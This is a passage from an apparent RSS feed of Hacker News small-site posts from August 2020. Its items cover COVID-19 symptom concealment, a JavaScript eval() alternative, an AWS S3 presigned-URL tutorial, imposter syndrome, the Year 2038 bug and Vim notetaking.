620w,https://i.cbc.ca/1.5695362.1598030728!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/alison-o-connor.jpg 780w,https://i.cbc.ca/1.5695362.1598030728!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/alison-o-connor.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5695362.1598030728!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/alison-o-connor.jpg"></p></div><figcaption>Alison O'Connor, a PhD student at Brock University, was the lead author on the study published in the Journal of Health Psychology.  <!-- --> <!-- -->(Brock University)</figcaption></figure></span></p>  <p>"One of the consequences is the potential difficulty in accurately tracking the pandemic," she said. "It reminds us that these numbers and the data are dependent&nbsp;on people telling the truth."</p>  <p>O'Connor says in some cases, people who concealed symptoms were afraid of stigma and social judgment, especially if they didn't follow public health guidelines. People who'd concealed symptoms were also less judgmental of other people doing the same.</p>  <p>O'Connor says this shows that shaming people and creating a stigma&nbsp;results in less reliable public health data.</p>  <p>"It's important to not necessarily blame people who are concealing this information, but to understand the barriers that are there from preventing them from telling the truth."</p>  <p>The team conducted the surveys through Amazon in late April and early May. That's why the respondents were American, O'Connor said. The team is interested in doing a similar survey in Canada, although O'Connor said work through Evans's&nbsp;<a href="http://www.brockscdlab.com/" rel="noopener noreferrer" target="_blank">Social and Cognitive Development Lab</a>&nbsp;shows the results would likely be similar.</p>  <p>That's true even in taking into account how politically charged the pandemic is in the U.S. O'Connor said she "can't rule out" that the political climate influenced the results, but there's no way to know for sure.</p>  <p>In every country, she said, "lying is a common social behaviour."</p>  <p>The research was published on Aug. 17 in the <em>Journal of Health Psychology</em>.&nbsp;</p>  <p>Here are some other highlights:</p>  <ul>   <li>53 per cent of participants with COVID-19 denied needing to quarantine when asked by others.</li>   <li>Females were more likely than males to readily disclose&nbsp;health symptoms.</li>   <li>Older adults and those who were more community oriented, gauged by their scores on the Communal Orientation Scale, were&nbsp;more honest&nbsp;about their COVID-19 status and behaviours.</li>   <li>Most of the participants had a post-secondary education.</li>  </ul>  <p>Evans says the results show that campaigns should focus&nbsp;on everyone being in this together.</p>  <p>"If we aren't honest about our symptoms and our social distancing behaviours, it will be difficult&nbsp;to keep COVID-19 positive numbers low until we find a vaccine," Evans said.</p>  <p>"Our honesty will help public health with contact tracing, reduce others' risks of interacting with us if we may be at risk, and in turn benefit society as a whole."</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/news/canada/hamilton/covid-19-1.5695230</link>
            <guid isPermaLink="false">hacker-news-small-sites-24267303</guid>
            <pubDate>Tue, 25 Aug 2020 01:18:56 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Safe eval() Alternative in JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24267198">thread link</a>) | @stin23
<br/>
August 24, 2020 | https://austinrepp.com/javascript-safe-eval/ | <a href="https://web.archive.org/web/*/https://austinrepp.com/javascript-safe-eval/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wrapper">
            

            <div id="container">


<div>
    <article itemscope="" itemtype="http://schema.org/BlogPosting">
        

        <div itemprop="articleBody">
    

    <p>A problem I encountered while creating <a href="https://discordbotstudio.org/">Discord Bot Studio</a>, was allowing users to enter variables which could be evaluated at runtime. Discord Bot Studio is a visual programming tool, so I felt it was important to offer a familiar variable syntax. Ideally, I wanted a user to be able to type a variable using the following notation, and have it be replaced with that variable’s value at runtime:</p>
<p>An example would be if I have an object as follows:</p>
<div><pre><code data-lang="javascript"><span>variableObject</span> {
    <span>variableName</span><span>:</span> {
        <span>fieldName</span><span>:</span> <span>"Austin"</span>
    }
}
</code></pre></div><p>The user should be able to retrieve that value “Austin” with the following syntax:</p>
<div><pre><code data-lang="javascript"><span>$</span>{<span>variableObject</span>.<span>variableName</span>.<span>fieldName</span>}
</code></pre></div><p>Rmember, this is a visual programming tool, so there could be any number of variables in an input string, or there could be none at all. The input is being evaluated at runtime, as it can be dynamic.</p>
<p>The seemingly obvious solution is to use Javascript’s <code>eval()</code> function, to evaluate the variables at runtime. Since DBS creates bots which will eventually be taking untrusted user input, this is not safe to do. Rather than trying to clean any incoming input, I settled on another solution which still allows variables with the dot (.) syntax to be evaluated.</p>
<h2 id="the-solution">The solution</h2>
<p>First I match variables in the input string using regex by looking for the ${} notation I mentioned above.</p>
<p>I trim the excess ${} from the match, and pass the resultant string to the following function, along with the object containing any variables that may be referenced by the user.</p>
<div><pre><code data-lang="javascript"><span>// desc = variableObject.variableName.fieldName
</span><span></span><span>/* obj = userVariables {
</span><span>    variableObject {
</span><span>        variableName: {
</span><span>            fieldName: "Austin"
</span><span>        }
</span><span>    }
</span><span>}
</span><span>*/</span>
<span>function</span> <span>getDescendantProp</span>(<span>obj</span>, <span>desc</span>) {
    <span>var</span> <span>arr</span> <span>=</span> <span>desc</span>.<span>split</span>(<span>"."</span>);

    <span>while</span> (<span>arr</span>.<span>length</span>) {
        <span>obj</span> <span>=</span> <span>obj</span>[<span>arr</span>.<span>shift</span>()];
    }
    <span>return</span> <span>obj</span>;
}
</code></pre></div><p>Here obj is the object containing any variables the user input should have access to. Desc is the trimmed match string. Continuing the example from above, desc would equal <code>variableObject.variableName.fieldName</code>. The string is split into an array on the periods.  <code>variableObject.variableName.fieldName</code> would be split into 
<code>[variableObject, variableName, fieldName]</code>. These array values are then shifted out in order, and used as keys to access the variable-containing object. This function will return just the string “Austin” using the example object from above.</p>
<p>By doing this, I can limit the variables that are available to the user, and also give them access to those variables using normal Javascript syntax. This can be extended if you would like to support <code>variableObject[variableName]</code> as well. This is not a true alternative to <code>eval()</code> for all scenarios, but it works well for indexing into objects at runtime.</p>

</div>

        

        
    </article>
</div>

            </div>
        </div></div>]]>
            </description>
            <link>https://austinrepp.com/javascript-safe-eval/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24267198</guid>
            <pubDate>Tue, 25 Aug 2020 00:59:30 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Video Face Recognition Software]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 3 (<a href="https://news.ycombinator.com/item?id=24267147">thread link</a>) | @rbitsoft
<br/>
August 24, 2020 | http://roundbit.tech/vfr | <a href="https://web.archive.org/web/*/http://roundbit.tech/vfr">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					<div id="infinite-post-wrap">
						
<article id="post-90">
	<div>
		
		<div>
			<!-- .entry-header -->

			<div>
				<p>Our first version of the Video Face Recognition software is now available to download Features: Learn to recognize faces from photos Select image files to train the AI Only one</p>
<p><a href="https://roundbit.tech/w/video-face-recognition/">Continue reading<span>Video Face Recognition 0.5</span></a></p>
			</div><!-- .entry-summary -->
		</div><!-- .entry-container -->
	</div><!-- .hentry-inner -->
</article><!-- #post-90 -->					</div><!-- .archive-post-wrap -->
				</div></div>]]>
            </description>
            <link>http://roundbit.tech/vfr</link>
            <guid isPermaLink="false">hacker-news-small-sites-24267147</guid>
            <pubDate>Tue, 25 Aug 2020 00:50:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Avoiding Imposter Syndrome Driven Development]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24267126">thread link</a>) | @helenanders26
<br/>
August 24, 2020 | https://helenanderson.co.nz/imposter-syndrome-stress/ | <a href="https://web.archive.org/web/*/https://helenanderson.co.nz/imposter-syndrome-stress/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
					
						
<p>If you’re taking your first steps into development you may have a nagging feeling like you don’t belong. Or that you’re failing because you don’t know ‘enough’ in your chosen field. You’re not alone. </p>



<p>Here’s how to recognise what you’re feeling, that it’s normal, and some strategies to feel better.</p>



<hr>



<h3>You don’t need to know everything, about everything</h3>



<p>You may be overthinking small mistakes. Feeling lost in meetings because there are terms and tools you’ve not heard before. Maybe you feel guilty for having to reluctantly ask for help after spending time googling, knowing that it must be something simple. And to make it worse, feeling like you’re falling farther and farther behind as the tech world moves on.</p>



<p>There is so much to learn about how things work in tech now, and things are constantly changing. Instead of comparing yourself to the seniors on your team use it as motivation to learn more from those around you.</p>



<hr>



<h3>Not every request is an emergency</h3>



<p>Even if you don’t have deadlines to meet, facing your team’s ticket queue or backlog of projects can seem overwhelming. You may not be managing the workflow but watching them piling up is stressful. You know you can’t whizz through and get everything ticked off in a day because you don’t have all the answers. </p>



<p>Even though the ticket is assigned to you, it’s not completely up to you to complete it. Your team are there to help you with a code review at the very least, but in most teams, it’s a collaborative effort and not all tasks are an emergency.</p>



<hr>



<h3>Leave work at work</h3>



<p>You may not realise it but it’s easy to let anxious feelings about work follow you home.  On your walk to work, walking home, even sitting on the couch after dinner. You may even fall into bed thinking about work, even if nothing bad has happened. Take time to disconnect from your work-life each day and do something else that refreshes your mind and makes you happy. Leaving work at work and focussing on all the other great things you have going on will keep things in perspective.</p>



<hr>



<h3>Remember the good stuff</h3>



<p>All too often we put pressure on ourselves to learn the next new thing on our wishlist of tools and technologies. But how often do you celebrate what you’ve learned so far?</p>



<p>Start a list of all the new things you’ve learned and&nbsp;the <a href="https://helenanderson.co.nz/big-data-a-to-z/" target="_blank" rel="noreferrer noopener">technologies</a>&nbsp;you’re using. When you put that on paper it reminds you that you are capable of learning new tools and how far you’ve come. </p>



<hr>



<h3>You’re doing great</h3>



<p>At some stage, everyone feels a little like an imposter. But you don’t need to be overwhelmed by it.  When you feel overwhelmed know you can talk to your manager and your team. They’ve been right where you are too, and may still feel like an imposter sometimes themselves. </p>



<p>The important thing is to give yourself a break, you’re doing great.</p>



<hr>



<p>Photo by&nbsp;<strong><a href="https://www.pexels.com/@skitterphoto?utm_content=attributionCopyText&amp;utm_medium=referral&amp;utm_source=pexels">Skitterphoto</a></strong>&nbsp;from&nbsp;<strong><a href="https://www.pexels.com/photo/pink-tulip-flowers-under-white-clouds-blue-skies-at-daytime-1019475/?utm_content=attributionCopyText&amp;utm_medium=referral&amp;utm_source=pexels">Pexels</a></strong></p>
					
					</div></div>]]>
            </description>
            <link>https://helenanderson.co.nz/imposter-syndrome-stress/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24267126</guid>
            <pubDate>Tue, 25 Aug 2020 00:45:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to serve premium/private content on your site?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24266871">thread link</a>) | @rajanpanchal
<br/>
August 24, 2020 | https://blog.rajanpanchal.net/how-to-serve-premiumprivate-content-on-your-site-cke6jrnsg00duxms1e7o52kr5 | <a href="https://web.archive.org/web/*/https://blog.rajanpanchal.net/how-to-serve-premiumprivate-content-on-your-site-cke6jrnsg00duxms1e7o52kr5">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section itemprop="articleBody mainEntityOfPage"><meta itemprop="thumbnailUrl image" content="https://cdn.hashnode.com/res/hashnode/image/upload/v1598549115771/RWPaNJmMu.jpeg?w=1600&amp;h=840&amp;fit=crop&amp;crop=entropy&amp;auto=format&amp;q=60"><div><div itemprop="text"><p>A lot of online companies (for example: Netflix, Udemy etc ) distribute contents over internet that is accessible only to the members of the site or who have subscribed or paid a premium. Today in this post we see how you can achieve this for your website using Amazon Web Services. We will see how you can securely serve private content to your users from AWS S3 bucket using S3 Presigned URLs</p>
<h3 id="what-are-presigned-urls">What are Presigned URLs?</h3>
<p>A <strong>Presigned URL</strong> is a <strong>URL</strong> that provides limited permission and time to make a request. Anyone who receives the presigned URL can then access the object. For example, if you have a file in your bucket and both the bucket and the object are private, you can share the file with others by generating a presigned URL. </p>
<h4 id="some-important-points-on-presigned-urls">Some important points on Presigned URLs</h4>
<ul>
<li>The creator of Presigned URL should have access to object for URL to work, otherwise URL wont work.</li>
<li>You can create a presigned URL that's are not usable or doesn’t work. </li>
<li>It doesn’t cost anything to create Presigned URLs.</li>
<li>You can set expiration time on the URLs </li>
<li>If you created a presigned URL using a temporary token, then the URL expires when the token expires, even if the URL was created with a later expiration time</li>
<li>You can revoke the URL by removing the permissions to access the object from the user created the URL.</li>
</ul>
<h3 id="how-to-create-presigned-url">How to create Presigned URL?</h3>
<p>When you create a presigned URL for your object, you must provide your security credentials, specify a bucket name, an object key, specify method and expiration time.</p>
<p>In Python, using Boto3, you can use <em>generate_presigned_url</em> method to generate the URL</p>
<pre><code>response = s3_client.generate_presigned_url(<span>'get_object'</span>,
            Params={<span>'Bucket'</span>: bucket_name,
            <span>'Key'</span>: object_name},
            ExpiresIn=expiration)
</code></pre><p>The <em>response</em> object will contain the URL which will look similar to this</p>
<pre><code><span>https</span>://somebucketname-rep.s3.amazonaws.com/someFileName.txt?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=ASIAQS3IOUWUZF7YSXGA<span>%2</span>F20200821<span>%2</span>Fus-east-2<span>%2</span>Fs3<span>%2</span>Faws4_request&amp;X-Amz-Date=20200821T051228Z&amp;X-Amz-Expires=3600&amp;X-Amz-SignedHeaders=host&amp;X-Amz-Security-Token=FwoGZXIvYXdzEH8aDCfJDxO0y6xQxYmdGCK2AXe71W<span>%2</span>FgZEg<span>%2</span>FSnSWC<span>%2</span>Fw<span>%2</span>FaJHeZ20M7OI7AqMEum5c98Chl6pSNPwE5Awsc3ySwokDF6L8a9wP0ceXWAmxT3WXLSoFeNHDbbEHfUKWnvGL8yFzAxdmf<span>%2</span>Fmi<span>%2</span>B5Tnl62td8Nad<span>%2</span>F0Ct1Sx11Mip1h2qdYxw80OX5bCTq7cAHHjpmupvaDt<span>%2</span>BZ3qVyIA9WZmeS63dCPOlieE9IiBZf<span>%2</span>FjxF4Mcs5w4ZIHtZL<span>%2</span>F3LvqMXAy3XfzCgnlYVZeCNczKLuv<span>%2</span>FfkFMi0mStwkzyO<span>%2</span>BfMIxWJ82GJmyNi7LZuY5r0Hx0mE<span>%2</span>BxLnre8jp9<span>%2</span>FACoV<span>%2</span>FM92GnsR0<span>%3</span>D&amp;X-Amz-Signature=17046b630ad4dede85af1cd57204bba8adc462a1825a35d93e81b656c683ad75
</code></pre><p>You can use this URL in the browser and access the object! Simple.. isn't it?</p>
<h3 id="lets-see-it-in-action">Lets see it in Action</h3>
<p>We are going to implement this on top of previous two posts, <a target="_blank" href="https://blog.rajanpanchal.net/aws-kms-use-case-with-serverless-application-model-sam-an-end-to-end-solution-ckdfenqag00lsqqs1csp05vhj">in the first post</a>, we implemented custom identity broker(signup/login), using AWS KMS to encrypt decryt password. In <a target="_blank" href="https://blog.rajanpanchal.net/how-to-give-access-to-aws-resources-without-creating-100s-of-iam-users-ckds91qj100pf97s1gc3v8vwb">second post</a>, we used AWS STS to AssumeRole to read bucket files names and now we will extend that to use presigned url. Download code for second post from <a href="http://github.com/rajanpanchal/aws-kms-sts" target="_blank">github.com/rajanpanchal/aws-kms-sts</a> and modify it.
Here is how overall process looks like
<img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/presignedUrl/presignedurl_diagram.jpg" alt="free cloud storage on s3, presigned URL diagram"></p>
<p>Open file <a href="http://showfiles.py/" target="_blank">showFiles.py</a> from the Lamdba folder and lets add function to generate presigned URL. Call this function from <em>getFilesList</em> function.</p>
<pre><code><span><span>def</span> <span>getSignedUrl</span><span>(key,s3_client)</span>:</span>
    KeyUrl = {}

    response = s3_client.generate_presigned_url(<span>'get_object'</span>,
                        Params={<span>'Bucket'</span>: os.environ[<span>'filesBucket'</span>],
                        <span>'Key'</span>: key},
                        ExpiresIn=<span>3600</span>)
    KeyUrl[key] = response
    <span>return</span> KeyUrl



<span><span>def</span> <span>getFilesList</span><span>()</span>:</span>
    sts_client = boto3.client(<span>'sts'</span>)

    
    
    assumed_role_object=sts_client.assume_role(
        RoleArn=os.environ[<span>'s3role'</span>],
        RoleSessionName=<span>"AssumeRoleSession1"</span>
    )

    
    
    credentials=assumed_role_object[<span>'Credentials'</span>]

    
    
    s3_resource=boto3.resource(
        <span>'s3'</span>,
        aws_access_key_id=credentials[<span>'AccessKeyId'</span>],
        aws_secret_access_key=credentials[<span>'SecretAccessKey'</span>],
        aws_session_token=credentials[<span>'SessionToken'</span>],
    )
    s3_client = boto3.client(<span>'s3'</span>,aws_access_key_id=credentials[<span>'AccessKeyId'</span>],
aws_secret_access_key=credentials[<span>'SecretAccessKey'</span>],
aws_session_token=credentials[<span>'SessionToken'</span>])
    bucket = s3_resource.Bucket(os.environ[<span>'filesBucket'</span>])
    files=[]
    <span>for</span> obj <span>in</span> bucket.objects.all():
        files.append(getSignedUrl(obj.key,s3_client))
    <span>return</span> files
</code></pre>
<p>We are using the temporary credentials obtained from <em>AssumeRole</em> to generate Presigned URL in <em>getSignedUrl</em> function. The <em>getFilesList</em> functions returns list of file names and presigned URL.</p>
<p>Now, modify showFiles.html, to iterate over response and create links for files</p>
<pre><code><span>&lt;<span>html</span>&gt;</span>
<span>&lt;<span>head</span>&gt;</span>
<span>&lt;<span>link</span> <span>rel</span>=<span>"stylesheet"</span> <span>href</span>=<span>"https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.css"</span> <span>integrity</span>=<span>"sha512-8bHTC73gkZ7rZ7vpqUQThUDhqcNFyYi2xgDgPDHc+GXVGHXq+xPjynxIopALmOPqzo9JZj0k6OqqewdGO3EsrQ=="</span> <span>crossorigin</span>=<span>"anonymous"</span> /&gt;</span>
<span>&lt;<span>script</span>
  <span>src</span>=<span>"https://code.jquery.com/jquery-3.1.1.min.js"</span>
  <span>integrity</span>=<span>"sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8="</span>
  <span>crossorigin</span>=<span>"anonymous"</span>&gt;</span><span></span><span>&lt;/<span>script</span>&gt;</span>

<span>&lt;<span>script</span> <span>src</span>=<span>"https://cdnjs.cloudflare.com/ajax/libs/semantic-ui/2.4.1/semantic.min.js"</span>&gt;</span><span></span><span>&lt;/<span>script</span>&gt;</span>
<span>&lt;/<span>head</span>&gt;</span>
<span>&lt;<span>body</span>&gt;</span>

<span>&lt;<span>div</span> <span>class</span>=<span>"ui raised very text container"</span>&gt;</span>
<span>&lt;<span>h1</span> <span>class</span>=<span>"ui header"</span>&gt;</span>File Access System<span>&lt;/<span>h1</span>&gt;</span>
<span>&lt;<span>i</span> <span>class</span>=<span>"folder open icon"</span>&gt;</span><span>&lt;/<span>i</span>&gt;</span><span>&lt;/<span>i</span>&gt;</span><span>&lt;<span>div</span> <span>class</span>=<span>"ui label"</span>&gt;</span>Files<span>&lt;/<span>div</span>&gt;</span>
<span>&lt;<span>div</span> <span>id</span>=<span>"files"</span> &gt;</span>Loading..<span>&lt;/<span>div</span>&gt;</span>
<span>&lt;/<span>div</span>&gt;</span>
<span>&lt;/<span>body</span>&gt;</span>
<span>&lt;<span>script</span>&gt;</span><span>

fetch(<span>"    https://g4m3zpzp95.execute-api.us-east-2.amazonaws.com/Prod/showFiles/"</span>, {
  credentials: <span>'include'</span>
})
  .then(response =&gt; response.text())
  .then((body) =&gt; {
    <span>var</span> files=<span>""</span>;

    <span>var</span> obj = <span>JSON</span>.parse(body)
    <span>for</span> (i = <span>0</span>; i &lt; obj.length; i++) {
            <span>var</span> o = obj[i]

            <span>for</span>(x <span>in</span> o){
                files =  files+ <span>"&lt;i class='file alternate outline icon'&gt;&lt;a href='"</span>+o[x]+<span>"' target='_blank'&gt;&amp;nbsp;&amp;nbsp;"</span>+x+<span>"&lt;/a&gt;"</span>
            }
    }
    <span>document</span>.getElementById(<span>"files"</span>).innerHTML= files
  })
  .catch(<span><span>function</span>(<span>error</span>) </span>{
    <span>console</span>.log(error); 
  });

</span><span>&lt;/<span>script</span>&gt;</span>
<span>&lt;/<span>html</span>&gt;</span>
</code></pre>
<p>Do SAM build and Deploy.
<img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/presignedUrl/presignedUrlStack.PNG" alt="Free cloud storage Presigned URL"></p>
<p>Modify login.html, signup.html and showFiles.html to update the api urls from cloudformation outputs.
Upload these files to the bucket <em>stsexamplebucket</em> or the bucket you created. Keep these files Public</p>
<p>You can find the code here:<br><a href="https://github.com/rajanpanchal/aws-kms-sts-presigned-url" target="_blank">github.com/rajanpanchal/aws-kms-sts-presign..</a></p>
<h3 id="testing">Testing</h3>
<p><img src="https://s3.amazonaws.com/blog-images-rajanpanchal.net/presignedUrl/testingVideo.gif" alt="private content serve using Presigned URL"></p>
<p>Let me know if you have any questions or comments!</p>
</div></div></section></div></div>]]>
            </description>
            <link>https://blog.rajanpanchal.net/how-to-serve-premiumprivate-content-on-your-site-cke6jrnsg00duxms1e7o52kr5</link>
            <guid isPermaLink="false">hacker-news-small-sites-24266871</guid>
            <pubDate>Tue, 25 Aug 2020 00:02:07 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Exit the Room – strategic game about exiting a room]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 2 (<a href="https://news.ycombinator.com/item?id=24266826">thread link</a>) | @nassimslab
<br/>
August 24, 2020 | https://nassims.itch.io/exit-the-room | <a href="https://web.archive.org/web/*/https://nassims.itch.io/exit-the-room">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>Exit the Room</strong> is a strategic game about getting out of a room by placing coins. You're a red square that can only rely on dice rolls to make movements. However you are able to place coins in the room that directs you in certain way. Will you be able to exit the room?&nbsp;</p>
<p><img src="https://img.itch.zone/aW1nLzQxMjU1NDEuZ2lm/original/Hdw99T.gif"><br></p>
<p><img src="https://img.itch.zone/aW1nLzQxMjEwMDAucG5n/original/faekcy.png"><br></p>
<p><img src="https://img.itch.zone/aW1nLzQxMjEwMTkucG5n/original/jFaSHw.png"><br></p>
<p>The game is still in development. The final version will contain 49 levels (The demo above contains 7) and will be available for Windows/Mac/Linux/Android for 5$.</p>
<p>If you're interested in the game and want to be notified when the game is done please follow me on itch.io !</p></div></div>]]>
            </description>
            <link>https://nassims.itch.io/exit-the-room</link>
            <guid isPermaLink="false">hacker-news-small-sites-24266826</guid>
            <pubDate>Mon, 24 Aug 2020 23:56:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[2038: Y2K, Unix, and the End of Time]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24266806">thread link</a>) | @wesleyabbey
<br/>
August 24, 2020 | https://www.wesleyabbey.io/post/2038-y2k-unix-and-the-end-of-time | <a href="https://web.archive.org/web/*/https://www.wesleyabbey.io/post/2038-y2k-unix-and-the-end-of-time">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Aug 23, 2020</p><img src="https://www.wesleyabbey.io/images/car-in-flames.jpeg" alt="The end of the world"><p><strong>7 seconds after 3:14am on January 19th, 2038 technology across the world will break.</strong></p><p>Programming with dates and time is a gross experience. Most programmers will eventually learn of this pain and all the bugs waiting to take down their software.</p><p>These bugs tend to pop up the most when we’re dealing with time zones, leap dates, and overflow. Time zones and leap dates could each be separate essays on developer pain and anxiety,<sup><a href="#footnote-1">1</a></sup> <!-- -->but for now let's talk about <em>overflow</em>. We’re going to specifically talk about <strong>the next Y2K</strong> known as the 2038 problem.</p><h2>Why Y2K was a problem</h2><p>Let’s clarify something: Y2K was a real problem, but it was blown out of proportion.<sup><a href="#footnote-2">2</a></sup> <!-- -->When the new millennium rolled around a lot of existing bugs had been found and fixed. While some issues were missed, nothing was catastrophic. However, 2038 could be a bigger problem than Y2K.</p><p>Y2K was an issue because of how computers store dates. The problem with Y2K was the years rolling over from 98, 99 ➡️00. This is going to be the same problem in 2038 but the number we use to track time will be the root of the problem.</p><h2>The Unix timestamp</h2><p>Practically all computers track time with the Unix timestamp. This is a counter that started on January 1st 1970 and has been ticking every second since then.</p><p>The current Unix timestamp:<!-- --> <span>1,598,240,362</span></p><h2>Integer overflow</h2><p>Y2K was a known problem because we knew the date was going to roll over from 99 to 00. 2038 is also a known problem for the same reason. The key difference is the date won’t roll over,<!-- --> <strong>the number itself will</strong>.</p><p>In computers we store numbers as integers. Most of these numbers are "signed 32-bit integers". This means numbers in computers have a maximum value that can be stored in memory. The maximum value for a signed 32-bit integer is 2,147,483,647. This means when the unix timestamp gets close to that number it will reset like the Y2K date did and overflow. It’ll go from 2,147,483,646 to 2,147,483,647 to 0 (Technically it goes to -2,147,483,648, but 0 makes the point a little clearer).</p><p>Because this counter is tied to time, we can predict it will happen at exactly 3:14am and 7 seconds on January 19th, 2038 UTC.</p><h2>Gangnam Style</h2><p>A good way of thinking about this problem is to compare it to the<!-- --> <a href="https://www.economist.com/the-economist-explains/2014/12/10/how-gangnam-style-broke-youtubes-counter">Gangnam Style video bug.</a></p><p>At one point Gangnam style got so many views it broke the view counter. It went from 2.1 billion views to -2.1 billion views. This is because YouTube didn't have a number large enough that was capable of storing the view count for the video.</p><h2>How will we fix this problem?</h2><p>Luckily this problem is still 18 years away so no one cares about it right now. I'm guessing everyone will wait until the last minute and then scramble to fix everything.</p><p>A good fix for some groups will be to change how the number is stored. If the number can be stored as a 64-bit integer this will help the immediate issue. This doesn’t fix the problem though, it only kicks the can down the road. But, it kicks the can down 292 billion years from now... That's 20 times longer than the age of the universe so I think that will work.</p><h2>Things will break</h2><p>We may know about this problem almost two decades in advance, but because of the massive amount of software out in the world it will be impossible to prevent every bug.</p><p>A lot of tech is being built with the ability to avoid this problem. This is great, but older systems will still be vulnerable.</p><p>I expect this to be a lot like the millennium bug. There will be real problems and some overblown fear. But at the end of the day few people outside of the developers fixing the bug should be affected.</p><p>Seconds until Y2K38:<!-- --> <span>549,243,285</span> </p><p><strong>Footnotes</strong></p><div><p id="footnote-1">1. Leap seconds are a thing.<!-- --> <a href="https://www.wired.com/2012/07/leap-second-bug-wreaks-havoc-with-java-linux/">They suck.</a></p><p id="footnote-2">2. I remember the start of the millennium clearly. My family threw a great New Years Eve party. It was a great time a lot of people came over and prepared for the countdown. No one really seemed worried about the millennium bug bringing about the new apocalypse.<br> The clock started counting down: 4, 3, 2, 1—Pure darkness. The power cut out. Otherwise reasonable people quickly started to freak out. The only other thing you could hear above the worried fussing of the people in the party was one person laughing.<br> It was my dad. He had just flipped the circuit breaker.</p></div><hr><div><p><img src="https://www.wesleyabbey.io/images/profile.jpg" alt="A handsome man."></p><p>I'm<!-- --> <a href="https://www.twitter.com/wesleyabbey" target="_blank" rel="noopener">Wesley</a>. I live in Boston and work on Wonderment. Passionately Curious.</p></div><a href="https://www.wesleyabbey.io/">Go back to home</a></div></div>]]>
            </description>
            <link>https://www.wesleyabbey.io/post/2038-y2k-unix-and-the-end-of-time</link>
            <guid isPermaLink="false">hacker-news-small-sites-24266806</guid>
            <pubDate>Mon, 24 Aug 2020 23:53:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Personal Notetaking in Vim]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24266528">thread link</a>) | @dvaun
<br/>
August 24, 2020 | https://vimways.org/2019/personal-notetaking-in-vim/ | <a href="https://web.archive.org/web/*/https://vimways.org/2019/personal-notetaking-in-vim/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="main">
		<div>
			<article id="content">
				

<blockquote>
<p>It pays you not to blink sometimes. It gives you a heck of a fright.</p>

<p>– My grandmother, on rapid change</p>
</blockquote>

<h2 id="intro">Intro</h2>

<p>Part of Vim’s power is how it can integrate with its environment. It can
interact with external programs, external scripts can interact with Vim, and
Vim is of course scriptable. Here, I’m going to detail an example of weaving
Vim with other applications and the environment to implement a notetaking
methodology that I personally use.</p>

<p>My notetaking has changed a lot over the years, from little to no notetaking (I
don’t recommend!), to experimenting with off-the-shelf tools
(<a href="https://simplenote.com/">Simplenote</a>, <a href="https://standardnotes.org/">Standardnotes</a>, <a href="https://github.com/vimwiki/vimwiki">Vimwiki</a>),
to experimenting with various knowledge management methodologies, to rolling my
own framework for <a href="https://zettelkasten.de/">Zettelkasten</a> in Vim. I haven’t yet achieved
the ideal setup, but it’s feeling close, and it’s reached a point where I can
comfortably use it for my needs.</p>

<h3 id="sidenote-create-consume-in-vim">Sidenote: Create + Consume in Vim</h3>

<p>Yes, you did see non-Vim tools in my list of previously used tools for notes…
It should be noted that I was using Vim as my main editor long before I
switched to using Vim to take notes. The reason why is that for a time I knew I
wanted to create and edit notes using Vim, but I wanted to be able to read
those notes in other ways, such as rich text from rendered markdown
(Simplenote), or a wiki that was navigable in a browser (Vimwiki). The times I
used Vim to edit was frustrating, because I needed to fit with a workflow that
required rebuilding a wiki after editing, or opening one file at a time for
something like Simplenote.</p>

<p>Finally, I realized that I didn’t actually need to read rich text or navigate
hyperlinks with a mouse in a browser. I could create <em>and consume</em> in Vim!
Granted, it’s not as pretty for viewing sometimes, but now creating, editing,
searching, and reading notes are all the same thing. Efficiency.</p>

<h3 id="zettelkasten">Zettelkasten</h3>

<p>One more thing to discuss before we dive in - what is Zettelkasten?.
Zettelkasten (German for “card index”) is a method for personal knowledge
management in which one uses many small atomic notes, linked to other such
notes. The idea is that it forms a huge interconnected network of notes one can
traverse and interact with. I came across this methodology a little while back
and love the idea. I haven’t yet spent the time to really learn how to use it
effectively, but I’ve started to use some of the ideas, including linking
between notes and facilitating easy creation of notes.</p>

<p>If you’re interested to know more about Zettelkasten as a system, see
